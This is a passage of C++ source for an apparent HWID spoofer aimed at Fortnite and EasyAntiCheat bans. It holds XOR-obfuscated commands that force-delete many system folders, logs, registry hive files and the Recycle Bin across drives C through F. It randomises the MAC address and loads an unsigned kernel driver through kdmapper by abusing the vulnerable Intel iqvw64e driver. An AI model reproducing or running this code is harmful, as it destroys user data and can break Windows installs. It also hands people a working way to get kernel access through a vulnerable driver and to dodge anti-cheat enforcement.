	DeleteFileW(XorWideString(L"E:\\Users\\Default\\NTUSER.DAT"));
	DeleteFileW(XorWideString(L"E:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat"));
	DeleteFileW(XorWideString(L"F:\\Windows\\System32\\spp\\store\\2.0\\data.dat"));
	DeleteFileW(XorWideString(L"F:\\Windows\\System32\\spp\\store\\2.0\\tokens.dat"));
	DeleteFileW(XorWideString(L"F:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat"));
	DeleteFileW(XorWideString(L"F:\\Users\\Public\\Libraries\\desktop.ini"));
	DeleteFileW(XorWideString(L"F:\\ProgramData\\ntuser.pol"));
	DeleteFileW(XorWideString(L"F:\\Users\\Default\\NTUSER.DAT"));
	DeleteFileW(XorWideString(L"F:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat"));
	system(XorString("rd /q /s %systemdrive%\\$Recycle.Bin >nul 2>&1"));
	system(XorString("rd /q /s d:\\$Recycle.Bin >nul 2>&1"));
	system(XorString("rd /q /s e:\\$Recycle.Bin >nul 2>&1"));
	system(XorString("rd /q /s f:\\$Recycle.Bin >nul 2>&1"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\servicing\\InboxFodMetadataCache"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\IconCacheToDelete"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\INF"));
	system(XorString("rmdir /s /q %systemdrive%\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\Prefetch"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\D3DSCache"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\CrashReportClient"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\temp"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\Logs"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\SoftwareDistribution\\DataStore\\Logs"));
	system(XorString("rmdir /s /q %systemdrive%\\ProgramData\\Microsoft\\Windows\\WER\\Temp"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\DxCache"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\Prefetch"));
	system(XorString("rmdir /s /q %systemdrive%\\ProgramData\\USOShared\\Logs"));
	system(XorString("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*"));
	system(XorString("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings"));
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins"));
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins"));
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"));
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat"));
	system(XorString("del /f /s /q %systemdrive%\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache"));
	system(XorString("del /f /s /q %systemdrive%\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache"));
	system(XorString("rmdir / s / q %systemdrive%\\Users\\%username%\\AppData\\Local\\Temp"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\INF"));
	system(XorString("rmdir /s /q %systemdrive%\\ProgramData\\%username%\\Microsoft\\XboxLive"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\Public\\Documents"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\Prefetch"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\D3DSCache"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\CrashReportClient"));
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\temp") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\SoftwareDistribution\\DataStore\\Logs") );
	system(XorString("rmdir /s /q %systemdrive%\\ProgramData\\Microsoft\\Windows\\WER\\Temp") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\DxCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\Prefetch") );
	system(XorString("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*") );
	system(XorString("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*") );
	system(XorString("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\XboxLive\\*.*") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings") );
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins") );
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins") );
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir") );
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config") );
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat") );
	system(XorString("del /f /s /q %systemdrive%\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache") );
	system(XorString("del /f /s /q %systemdrive%\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Temp") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\IEDownloadHistory") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\IECompatUaCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\IECompatCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\DNTException") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\PrivacIE") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History\\Low") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.OneConnect_8wekyb3d8bbwe\\LocalState") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\LocalCache\\EcsCache0") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\TempState") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\TargetedContentCache\\v3") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\Intel") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData") );
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\UnrealEngine") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\UnrealEngineLauncher") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\INTEL") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\ntuser.ini") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache") );
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\System Volume Information\\IndexerVolumeGuid") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\CLR_v4.0") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\CLR_v3.0") );
	system(XorString("rmdir /s /q ""\"\%systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery") );
	system(XorString("@del /s /f /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds") );
	system(XorString("@del /s /f /q %systemdrive%\\Windows\\System32\\restore\\MachineGuid.txt") );
	system(XorString("@del /s /f /q %systemdrive%\\ProgramData\\Microsoft\\Windows\\WER") );
	system(XorString("@del /s /f /q %systemdrive%\\Users\\Public\\Libraries") );
	system(XorString("@del /s /f /q %systemdrive%\\MSOCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\ConnectedDevicesPlatform\\L.%username%\\ActivitiesCache.db-wal") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\SoftwareDistribution\\DataStore\\Logs") );
	system(XorString("rmdir /s /q %systemdrive%\\ProgramData\\USOShared\\Logs\\User") );
	system(XorString("@del /s /f /q %systemdrive%\\Users\\%username%\\AppData\\Local\\D3DSCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\ConnectedDevicesPlatform\\CDPGlobalSettings.cdp") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\cache\\qtshadercache") );
	system(XorString("@del /s /f /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.log2") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\VkCache") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\CN\\NewsFeed") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\RHKRUA8J") );
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\Temp") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\SERVIC~1\\NETWOR~1\\AppData\\Local\\Temp") );
	system(XorString("rmdir /s /q %systemdrive%\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache") );
	clean_launcher();
	clean_net();
	wipe_c();
	wipe_d();
	wipe_e();
	wipe_f();
	system(XorString("cls"));
	return 0;
}

//---------------INITIALIZATION--------------//

void Initialize()
{
	printf(XorString("\n   Welcome !\n\n"));
	printf(XorString("  This software will change this parts of your computer informations :\n\n"));
	printf(XorString("     -Disk\n     -Ram\n     -Bios\n     -Mac\n     -Cpu\n     -Volume\n     -Gpu\n\n"));
	printf(XorString("  Wait for initialisation..."));
	Sleep(3500);

	system(XorString("cls"));
	system(XorString("wmic diskdrive get serialnumber"));
	Sleep(4000);

	printf(XorString("\n  Wait for cleaner !"));
	Sleep(1000);

	HideConsole();
	clean();
	ShowConsole();

	system(XorString("cls"));
	printf(XorString("\n Cleaned !"));
	Sleep(2500);

	system(XorString("cls"));
	printf(XorString("\n  Wait for MAC Changer..."));
	Sleep(2500);
	MyMACAddr* ptr = new MyMACAddr();
	ptr->AssingRndMAC();

	system(XorString("cls"));
	printf(XorString("\n MAC spoofed !"));
	Sleep(3000);

	system(XorString("cls"));
	printf(XorString("\n  Wait for spoof..."));
	Sleep(500);

	system(XorString("cls"));
}

//---------------MAIN--------------//

int main(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	Initialize();

	HANDLE iqvw64e_device_handle = intel_driver::Load();

	if (!iqvw64e_device_handle || iqvw64e_device_handle == INVALID_HANDLE_VALUE)
	{
		Sleep(2000);
		return -1;
	}

	if (!kdmapper::MapDriver(iqvw64e_device_handle, RawData))
	{
		intel_driver::Unload(iqvw64e_device_handle);
		return -1;
	}
	intel_driver::Unload(iqvw64e_device_handle);
	
	system(XorString("wmic diskdrive get serialnumber"));
	Sleep(4000);

	MessageBoxA(0, XorString("If you don't have any errors you are now spoofed !"), XorString("Success"),0);
}
